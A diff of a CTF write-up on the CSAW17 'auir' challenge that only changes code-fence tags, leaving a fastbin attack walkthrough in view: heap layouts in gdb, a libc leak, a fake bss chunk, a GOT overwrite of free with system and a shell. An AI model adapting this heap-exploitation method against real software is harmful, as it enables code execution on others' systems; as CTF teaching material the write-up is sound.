@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $	pwn checksec auir 
 [*] '/Hackery/pod/modules/fastbin_attack/csaw17_auir/auir'
     Arch:     amd64-64-little
@@ -31,7 +31,7 @@ So we can see that we are dealing with a `64` bit binary, with a Non-Executable 
 
 So when we reverse this, it becomes clear pretty quickly that the code has been obfuscated and will be a pain to reverse. How I reversed this was I looked for strings that a particular option displayed, which would lead me to a function, and I would just skim over the C pseudocode for it. Also I did a bit of guess and check with assuming what options did what. Then I would go into gdb, and verify what I saw from the function. From that we can determine that the 5 options do the following:
 
-```
+```text
 MAKE ZEALOTS:	Prompts you for a size, allocates that size in the heap with malloc, then allows you to scan in the amount of bytes allocated into the heap chunk.
 DESTROY ZEALOTS: It frees the heap chunk for the zealot you give it.
 FIX ZEALOTS: Allows you to scan in data into a Zealot. Does not check for an overflow.
@@ -41,14 +41,14 @@ GO HOME: Exits the program
 
 In addition to that, we find that in the bss section of memory there are two interesting pieces of data. These can also be found by searching for the data we inputted and seeing where in the heap they were, then searching for where the pointers to those memory areas were stored (based on previous experience I kind of assumed this program would have something like these):
 
-```
+```text
 0x605310:	Stores pointers for all of the Zealots allocated
 0x605630:	Integer that stores the amount of Zealots allocated
 ```
 
 and we can confirm that with gdb:
 
-```
+```gdb
 gdb-peda$ x/4g 0x605310
 0x605310:	0x0000000000617c20	0x0000000000617c40
 0x605320:	0x0000000000617c60	0x0000000000000000
@@ -76,7 +76,7 @@ So that was a brief high level overview. Let's see how the memory is actually ma
 
 First allocated some chunks (I allocated four):
 
-```
+```gdb
 gef➤  x/100g 0xdfec10
 0xdfec10:	0x0	0x101
 0xdfec20:	0x3030303030303030	0x3030303030303030
@@ -126,7 +126,7 @@ gef➤  x/100g 0xdfec10
 ```
 
 Then I freed the bottom two and checked to see what the memory was like:
-```
+```gdb
 gef➤  x/100g 0xdfec10
 0xdfec10:	0x0	0x101
 0xdfec20:	0x3030303030303030	0x3030303030303030
@@ -181,7 +181,7 @@ So we can see that there are the arena pointers at `0xdfeda0` and `0xdfeda8` whi
 
 Next up is the fastbin attack to allocate a fake chunk in the bss, to start overwriting heap pointers and do a got table overwrite. Picking up from where we left off in the libc infoleak, we allocate two chunks of size `0x60` and free them to add them to the fastbin list:
 
-```
+```gdb
 gef➤  x/10g 0x605310
 0x605310:	0xfd6c20	0xfd6d20
 0x605320:	0xfd6da0	0xfd6ea0
@@ -194,14 +194,14 @@ gef➤  x/g 0xfd6e10
 
 So we can see that the top chunk has a next pointer to the next chunk in the fastbin. We are going to edit that to be the address of our fake chunk:
 
-```
+```gdb
 gef➤  x/g 0xfd6e10
 0xfd6e10:	0x6052ed
 ```
 
 Next up we will allocate a chunk of size `0x60`. This will give us chunk `5`, and add our fake chunk to the top of the fastbin:
 
-```
+```gdb
 gef➤  x/10g 0x605310
 0x605310:	0xfd6c20	0xfd6d20
 0x605320:	0xfd6da0	0xfd6ea0
@@ -216,7 +216,7 @@ gef➤  search-pattern 0x00000000006052ed
 
 So we can see that malloc returned the chunk we got at index `5` (`0x605338`). We also see that our fake chunk `0x6052ed` is in the libc, in the fastbin list. We will allocate another chunk of `0x60` and instead of it giving us the chunk at index `4`, it will give us our fake chunk:
 
-```
+```gdb
 gef➤  x/10g 0x605310
 0x605310:	0xfd6c20	0xfd6d20
 0x605320:	0xfd6da0	0xfd6ea0
@@ -227,7 +227,7 @@ gef➤  x/10g 0x605310
 
 So we can see that we were able to execute the fastbin attack to get malloc to return our fake chunk to the bss. Next up we will overwrite the first heap pointer with the got table entry address for free:
 
-```
+```gdb
 gef➤  x/10g 0x605310
 0x605310:	0x605060	0xfd6d20
 0x605320:	0xfd6da0	0xfd6ea0
@@ -242,7 +242,7 @@ gef➤  x/i 0x7f56bc6c44f0
 
 Next up, we will do the got table overwrite:
 
-```
+```gdb
 gef➤  x/10g 0x605310
 0x605310:	0x0000000000605060	0x0000000000fd6d20
 0x605320:	0x0000000000fd6da0	0x0000000000fd6ea0
@@ -257,7 +257,7 @@ gef➤  x/i 0x00007f56bc685390
 
 Lastly we will just edit the chunk at index `1` to be `/bin/sh\x00` (we could of just created the chunk to have that string, but that would make sense):
 
-```
+```gdb
 gef➤  x/10g 0x605310
 0x605310:	0x0000000000605060	0x0000000000fd6d20
 0x605320:	0x0000000000fd6da0	0x0000000000fd6ea0
@@ -274,7 +274,7 @@ After that, we just have to free the chunk at index `1` and it will run `system(
 
 Putting it all together, we get the following exploit. In order for this exploit to work, you do need to run it with libc version `libc-2.23.so`. Also I ran this exploit on Ubuntu 16.04:
 
-```
+```python
 from pwn import *
 
 # Establish the target binary and libc version
@@ -374,7 +374,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $	python exploit.py 
 [+] Starting local process './auir': pid 5157
 [*] '/home/guyinatuxedo/Desktop/elementary/auir'
